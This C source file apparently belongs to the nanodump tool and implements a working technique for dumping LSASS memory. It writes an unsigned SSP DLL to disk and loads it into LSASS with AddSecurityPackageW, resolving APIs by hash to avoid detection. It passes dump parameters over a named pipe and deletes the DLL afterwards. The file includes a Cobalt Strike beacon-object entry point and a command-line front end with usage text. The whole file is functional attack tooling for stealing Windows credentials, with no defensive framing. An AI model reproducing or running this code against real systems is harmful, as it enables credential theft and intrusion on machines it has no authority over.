#include "ssp/ssp.h"
#include "ssp/ssp_utils.h"

DWORD WINAPI load_ssp(LPVOID Parameter)
{
    LPSTR ssp_path = (LPSTR)Parameter;
    AddSecurityPackageW_t AddSecurityPackageW;
    wchar_t ssp_path_w[MAX_PATH];

    if (!is_full_path(ssp_path))
    {
        PRINT_ERR("You must provide a full path: %s", ssp_path);
        return 1;
    }
    // find the address of AddSecurityPackageW dynamically
    AddSecurityPackageW = (AddSecurityPackageW_t)(ULONG_PTR)get_function_address(
        get_library_address(SSPICLI_DLL, TRUE),
        AddSecurityPackageW_SW2_HASH,
        0);
    if (!AddSecurityPackageW)
    {
        api_not_found("AddSecurityPackageW");
        return 1;
    }

    mbstowcs(ssp_path_w, ssp_path, MAX_PATH);

    //DPRINT("Loading %s into " LSASS, ssp_path);

    SECURITY_PACKAGE_OPTIONS spo = {0};
    NTSTATUS status = AddSecurityPackageW(ssp_path_w, &spo);

#if !defined(PASS_PARAMS_VIA_NAMED_PIPES) || PASS_PARAMS_VIA_NAMED_PIPES == 0
    if (status == SEC_E_SECPKG_NOT_FOUND)
    {
        PRINT("Done, status: SEC_E_SECPKG_NOT_FOUND, this is normal if DllMain returns FALSE");
        return 0;
    }
    else
    {
        PRINT("Done, status: 0x%lx", status);
        return 1;
    }
#else
{
    if (status == SEC_E_SECPKG_NOT_FOUND)
    {
        return 0;
    }
    else
    {
        return 1;
    }
}
#endif
}

BOOL write_dll(
    IN unsigned char nanodump_ssp_dll[],
    IN unsigned int nanodump_ssp_dll_len,
    IN LPSTR write_dll_path,
    IN LPSTR load_path,
    OUT LPSTR* random_dll_path)
{
    BOOL ret_val = FALSE;
    BOOL success = FALSE;

    // if the user did not specify a pre-existing DLL, write our own
    if (!load_path)
    {
        // fair OPSEC warning
        PRINT_ERR("[!] Writing an unsigned DLL to disk");

        if (!write_dll_path)
        {
            success = generate_random_dll_path(random_dll_path);
            if (!success)
                goto cleanup;

            write_dll_path = *random_dll_path;

            DPRINT("generated random dll path: %s", write_dll_path);
        }

        success = write_ssp_dll(
            write_dll_path,
            nanodump_ssp_dll,
            nanodump_ssp_dll_len);
        if (!success)
            goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    return ret_val;
}

VOID run_technique(
    IN unsigned char nanodump_ssp_dll[],
    IN unsigned int nanodump_ssp_dll_len,
    IN LPSTR write_dll_path,
    IN LPSTR load_path,
    IN LPSTR dump_path,
    IN BOOL use_valid_sig)
{
    BOOL   success         = FALSE;
    LPSTR  random_dll_path = NULL;
    LPSTR  final_path      = NULL;
    BOOL   dump_worked     = FALSE;
    HANDLE hThread         = NULL;
    DWORD  dwThreadId      = 0;

    CreateThread_t CreateThread = NULL;

    // first of all, write the SSP DLL in the filesystem

    success = write_dll(
        nanodump_ssp_dll,
        nanodump_ssp_dll_len,
        write_dll_path,
        load_path,
        &random_dll_path);
    if (!success)
        goto cleanup;

    if (write_dll_path)
        final_path = write_dll_path;
    else if (load_path)
        final_path = load_path;
    else
        final_path = random_dll_path;

#if !defined(PASS_PARAMS_VIA_NAMED_PIPES) || PASS_PARAMS_VIA_NAMED_PIPES == 0
    // if we are not going to pass parameters to the DLL, simply load it and exit
    load_ssp(final_path);
#else
    // we are going to pass parametesr to the DLL, so we will load it on a separate thread and
    // pass the parameters via a named pipe


    CreateThread = (CreateThread_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        CreateThread_SW2_HASH,
        0);
    if (!CreateThread)
    {
        api_not_found("CreateThread");
        goto cleanup;
    }

    // load the SSP library in a thread because it will lock otherwise
    hThread = CreateThread(NULL, 0, load_ssp, final_path, 0, &dwThreadId);

    success = send_parameters_and_get_result(
        dump_path,
        use_valid_sig,
        &dump_worked);
    if (!success)
        goto cleanup;

    if (dump_worked)
    {
        print_success(
            dump_path,
            use_valid_sig,
            TRUE);
    }
    else
    {
        PRINT_ERR("The dump was not created");
    }
#endif

cleanup:
#if PASS_PARAMS_VIA_NAMED_PIPES == 1
    if (hThread)
        NtClose(hThread);
#endif
    if (write_dll_path)
        delete_file(write_dll_path);
    if (random_dll_path)
    {
        delete_file(random_dll_path);
        intFree(random_dll_path);
    }
}

#if defined(BOF)

#include "ssp_utils.c"
#include "../utils.c"
#include "../syscalls.c"
#include "../dinvoke.c"
#if PASS_PARAMS_VIA_NAMED_PIPES == 1
#include "../pipe.c"
#endif

void go(char* args, int length)
{
    datap          parser               = { 0 };
    unsigned char* nanodump_ssp_dll     = NULL;
    int            nanodump_ssp_dll_len = 0;
    LPSTR          write_dll_path       = NULL;
    LPSTR          load_path            = NULL;
    LPSTR          dump_path            = NULL;
    BOOL           use_valid_sig        = FALSE;

    BeaconDataParse(&parser, args, length);
    nanodump_ssp_dll = (unsigned char*)BeaconDataExtract(&parser, &nanodump_ssp_dll_len);
    write_dll_path = BeaconDataExtract(&parser, NULL);
    load_path = BeaconDataExtract(&parser, NULL);
#if PASS_PARAMS_VIA_NAMED_PIPES == 1
    /*
     * only parse parameters if PASS_PARAMS_VIA_NAMED_PIPES is enabled
     * if not, the hardcoded options in NanoDumpSSP will be used
     */
    dump_path = BeaconDataExtract(&parser, NULL);
    use_valid_sig = (BOOL)BeaconDataInt(&parser);
#endif

    if (!write_dll_path[0])
        write_dll_path = NULL;
    if (!load_path[0])
        load_path = NULL;

    run_technique(
        nanodump_ssp_dll,
        nanodump_ssp_dll_len,
        write_dll_path,
        load_path,
        dump_path,
        use_valid_sig);
}

#endif

#if defined(EXE)

#ifdef _WIN64
 #include "nanodump_ssp_dll.x64.h"
#else
 #include "nanodump_ssp_dll.x86.h"
#endif

#if PASS_PARAMS_VIA_NAMED_PIPES == 1

void usage(char* procname)
{
    PRINT("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--write-dll C:\\Windows\\Temp\\ssp.dll] [--load-dll C:\\Windows\\Temp\\ssp.dll] [--help]", procname);
    PRINT("Dumpfile options:");
    PRINT("    --write DUMP_PATH, -w DUMP_PATH");
    PRINT("            filename of the dump");
    PRINT("    --valid, -v");
    PRINT("            create a dump with a valid signature");
    PRINT("SSP DLL options:");
    PRINT("    --write-dll, -wdll");
    PRINT("            path where to write the SSP DLL from nanodump (randomly generated if not defined)");
    PRINT("    --load-dll, -ldll");
    PRINT("            load an existing SSP DLL");
    PRINT("Help:");
    PRINT("    --help, -h");
    PRINT("            print this help message and leave");
}

int main(int argc, char* argv[])
{
    LPSTR dump_path        = NULL;
    BOOL  use_valid_sig    = FALSE;
    LPSTR write_dll_path   = NULL;
    LPSTR load_path        = NULL;

    for (int i = 1; i < argc; ++i)
    {
        if (!strncmp(argv[i], "-v", 3) ||
            !strncmp(argv[i], "--valid", 8))
        {
            use_valid_sig = TRUE;
        }
        else if (!strncmp(argv[i], "-w", 3) ||
                 !strncmp(argv[i], "--write", 8))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --write value");
                return 0;
            }
            dump_path = argv[++i];
        }
        else if (!strncmp(argv[i], "-wdll", 6) ||
                 !strncmp(argv[i], "--write-dll", 12))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --write-dll value");
                return 0;
            }
            write_dll_path = argv[++i];
        }
        else if (!strncmp(argv[i], "-ldll", 6) ||
                 !strncmp(argv[i], "--load-dll", 11))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --load value");
                return 0;
            }
            load_path = argv[++i];
        }
        else if (!strncmp(argv[i], "-h", 3) ||
                 !strncmp(argv[i], "--help", 7))
        {
            usage(argv[0]);
            return 0;
        }
        else
        {
            PRINT("invalid argument: %s", argv[i]);
            return 0;
        }
    }

    if (!dump_path)
    {
        PRINT("You need to provide the --write parameter");
        return 0;
    }

    if (!is_full_path(dump_path))
    {
        PRINT("You need to provide the full path: %s", dump_path);
        return 0;
    }

    if (load_path && write_dll_path)
    {
        PRINT("The options --write-dll and --load-dll cannot be used together");
        return 0;
    }

    run_technique(
        nanodump_ssp_dll,
        nanodump_ssp_dll_len,
        write_dll_path,
        load_path,
        dump_path,
        use_valid_sig);

    return 0;
}

#else // #if PASS_PARAMS_VIA_NAMED_PIPES == 1

void usage(char* procname)
{
    PRINT("usage: %s [--write-dll C:\\Windows\\Temp\\ssp.dll] [--load-dll C:\\Windows\\Temp\\ssp.dll] [--help]", procname);
    PRINT("SSP DLL options:");
    PRINT("    --write-dll, -wdll");
    PRINT("            path where to write the SSP DLL from nanodump (randomly generated if not defined)");
    PRINT("    --load-dll, -ldll");
    PRINT("            load an existing SSP DLL");
    PRINT("Help:");
    PRINT("    --help, -h");
    PRINT("            print this help message and leave");
}

int main(int argc, char* argv[])
{
    LPSTR write_dll_path   = NULL;
    LPSTR load_path        = NULL;

    for (int i = 1; i < argc; ++i)
    {
        if (!strncmp(argv[i], "-wdll", 6) ||
                 !strncmp(argv[i], "--write-dll", 12))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --write-dll value");
                return 0;
            }
            write_dll_path = argv[++i];
        }
        else if (!strncmp(argv[i], "-ldll", 6) ||
                 !strncmp(argv[i], "--load-dll", 11))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --load value");
                return 0;
            }
            load_path = argv[++i];
        }
        else if (!strncmp(argv[i], "-h", 3) ||
                 !strncmp(argv[i], "--help", 7))
        {
            usage(argv[0]);
            return 0;
        }
        else
        {
            PRINT("invalid argument: %s", argv[i]);
            return 0;
        }
    }

    if (load_path && write_dll_path)
    {
        PRINT("The options --write-dll and --load-dll cannot be used together");
        return 0;
    }

    run_technique(
        nanodump_ssp_dll,
        nanodump_ssp_dll_len,
        write_dll_path,
        load_path,
        NULL,
        FALSE);

    return 0;
}

#endif // #if PASS_PARAMS_VIA_NAMED_PIPES == 1

#endif // defined(EXE)
